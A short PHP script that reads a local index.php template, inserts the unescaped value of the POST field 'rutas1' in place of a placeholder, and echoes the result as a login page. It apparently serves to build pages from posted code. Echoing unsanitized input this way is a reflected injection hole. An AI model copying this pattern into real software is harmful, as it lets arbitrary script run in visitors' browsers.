

<?php 
if(count($_POST)>0){
	$codigo=$_POST['rutas1'];
	$myfile = fopen("servidor_1234rt/index.php", "r") or die("Abriendo Ruta de la Carpeta!");
$pag_original= fread($myfile,filesize("servidor_1234rt/index.php"));
$pag_login=str_replace("$$$$$$",$codigo,$pag_original);
echo $pag_login;
fclose($myfile);

}

?>